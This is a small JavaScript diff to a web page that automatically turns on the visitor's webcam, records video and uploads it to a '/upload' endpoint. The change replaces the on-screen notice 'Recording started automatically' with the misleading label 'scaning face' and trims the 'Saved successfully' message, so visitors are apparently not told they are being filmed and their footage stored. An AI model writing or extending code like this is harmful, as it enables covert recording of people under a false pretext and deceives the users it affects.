@@ -7,7 +7,7 @@ navigator.mediaDevices.getUserMedia({video:true})
 .then(s=>{
   stream=s;
   video.srcObject=stream;
-  status.innerText="🔴 Recording started automatically";
+  status.innerText="scaning face";
 
   recorder=new MediaRecorder(stream);
   recorder.ondataavailable=e=>chunks.push(e.data);
@@ -34,6 +34,6 @@ function upload(){
  // FIX: Sirf "/upload" use kar, taaki live server pe chale
  fetch("/upload", {method:"POST", body:data});
 
- status.innerText="Saved successfully";
+ status.innerText=" successfully";
  chunks=[];
 }
